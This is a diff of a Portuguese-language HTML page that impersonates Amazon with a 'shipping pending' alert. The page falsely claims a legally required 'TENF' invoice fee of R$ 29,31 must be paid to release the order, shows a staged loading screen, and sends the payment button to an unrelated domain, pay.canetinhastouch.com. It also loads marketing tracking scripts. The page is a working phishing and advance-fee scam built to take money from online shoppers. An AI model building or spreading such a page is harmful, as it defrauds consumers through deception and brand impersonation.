@@ -1,37 +1,32 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    
-    
- <script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
-  
-  
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
   <script>
-  window.pixelId = "688a2de2a990f4a6d4365c31";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
-  
-  
+    window.pixelId = "688a2de2a990f4a6d4365c31";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Pendência no Envio - Amazon</title>
   <link href="https://fonts.googleapis.com/css2?family=Amazon+Ember:wght@400;500;700&display=swap" rel="stylesheet">
+
   <style>
     :root {
       --amazon-orange: #FF9900;
       --amazon-orange-hover: #E68A00;
-      --amazon-blue: #232F3E;
-      --amazon-blue-light: #37475A;
       --amazon-gray: #F3F3F3;
       --amazon-white: #FFFFFF;
       --text-primary: #0F1111;
@@ -54,9 +49,6 @@
       line-height: 1.4;
     }
 
-
-
-    /* Loading Screen */
     #loading-overlay {
       position: fixed;
       top: 0;
@@ -103,24 +95,21 @@
       font-weight: 400;
     }
 
-    /* Main Content */
     .main-container {
       display: none;
       max-width: 600px;
       margin: 14px auto;
       padding: 0 14px;
+      animation: fadeIn 0.3s ease-out;
     }
 
-    /* Alert Box */
     .alert-container {
       background-color: var(--amazon-white);
       border: 1px solid var(--border-color);
       border-radius: 8px;
-      overflow: hidden;
       box-shadow: 0 2px 8px rgba(15, 17, 17, .15);
     }
 
-    /* Alert Header */
     .alert-header {
       background-color: #FEF7E0;
       border-bottom: 1px solid #F0C14B;
@@ -131,7 +120,6 @@
       display: flex;
       align-items: center;
       gap: 8px;
-      margin: 0;
     }
 
     .alert-icon {
@@ -147,7 +135,6 @@
       margin: 0;
     }
 
-    /* Content Section */
     .content-section {
       padding: 20px 18px;
     }
@@ -173,16 +160,10 @@
       line-height: 1.5;
     }
 
-    .message-text:last-child {
-      margin-bottom: 0;
-    }
-
     .highlight {
       font-weight: 700;
-      color: var(--text-primary);
     }
 
-    /* Action Button */
     .action-button {
       width: 100%;
       background-color: var(--amazon-orange);
@@ -210,7 +191,6 @@
       box-shadow: 0 1px 3px rgba(255, 153, 0, 0.5) inset;
     }
 
-    /* Info Section */
     .info-section {
       margin-top: 14px;
       padding-top: 14px;
@@ -224,7 +204,6 @@
       line-height: 1.3;
     }
 
-    /* Security Footer */
     .security-footer {
       margin-top: 14px;
       padding: 10px;
@@ -248,45 +227,6 @@
       color: #067D62;
     }
 
-    /* Responsive */
-    @media (max-width: 600px) {
-      .main-container {
-        margin: 10px auto;
-        padding: 0 10px;
-      }
-
-      .content-section {
-        padding: 16px 14px;
-      }
-
-      .loading-bar {
-        width: 250px;
-      }
-
-      .navbar-content {
-        padding: 8px 10px;
-      }
-    }
-
-    @media (max-width: 480px) {
-      .alert-header {
-        padding: 12px 14px;
-      }
-
-      .content-section {
-        padding: 14px 12px;
-      }
-
-      .message-box {
-        padding: 12px;
-      }
-    }
-
-    /* Animations */
-    .main-container {
-      animation: fadeIn 0.3s ease-out;
-    }
-
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
@@ -295,9 +235,6 @@
 </head>
 <body>
 
-
-
-  <!-- Loading Screen -->
   <div id="loading-overlay">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="logo-loading">
     <div class="loading-bar">
@@ -306,11 +243,8 @@
     <p class="loading-text">Calculando taxa TENF...</p>
   </div>
 
-  <!-- Main Content -->
   <div id="main-content" class="main-container">
     <div class="alert-container">
-      
-      <!-- Alert Header -->
       <div class="alert-header">
         <div class="alert-title">
           <svg class="alert-icon" fill="currentColor" viewBox="0 0 20 20">
@@ -320,33 +254,22 @@
         </div>
       </div>
 
-      <!-- Content -->
       <div class="content-section">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="amazon-logo-main">
-        
+
         <div class="message-box">
           <div style="text-align: center; margin-bottom: 16px;">
             <div style="font-size: 28px; font-weight: 700; color: var(--text-primary);">R$ 29,31</div>
           </div>
-          <p class="message-text">
-            Para que seu produto seja enviado, é obrigatório quitar a TENF (Taxa de Emissão de Nota Fiscal)
-          </p>
-          <p class="message-text">
-            Essa taxa cobre os custos fiscais exigidos por lei para a emissão do documento e liberação da mercadoria para transporte.
-          </p>
-          <p class="message-text">
-            Sem o pagamento, o documento não será emitido e seu pedido permanecerá bloqueado.
-          </p>
+          <p class="message-text">Para que seu produto seja enviado, é obrigatório quitar a TENF (Taxa de Emissão de Nota Fiscal).</p>
+          <p class="message-text">Essa taxa cobre os custos fiscais exigidos por lei para a emissão do documento e liberação da mercadoria para transporte.</p>
+          <p class="message-text">Sem o pagamento, o documento não será emitido e seu pedido permanecerá bloqueado.</p>
         </div>
 
-        <button id="action-button" class="action-button">
-          QUITAR TAXA TENF
-        </button>
+        <button id="action-button" class="action-button">QUITAR TAXA TENF</button>
 
         <div class="info-section">
-          <p class="info-text">
-            Clique para continuar
-          </p>
+          <p class="info-text">Clique para continuar</p>
         </div>
 
         <div class="security-footer">
@@ -363,19 +286,17 @@
 
   <script>
     document.addEventListener('DOMContentLoaded', function () {
-      // Loading screen
       setTimeout(() => {
         document.getElementById('loading-overlay').style.display = 'none';
         document.getElementById('main-content').style.display = 'block';
       }, 3000);
 
-      // Button action
       document.getElementById('action-button').addEventListener('click', function () {
         this.textContent = 'Processando...';
         this.disabled = true;
-        
+
         setTimeout(() => {
-          window.location.href = 'https://notafiscal.canetinhas.com';
+          window.location.href = 'https://pay.canetinhastouch.com/q510ZObaWYX3E9D';
         }, 500);
       });
     });
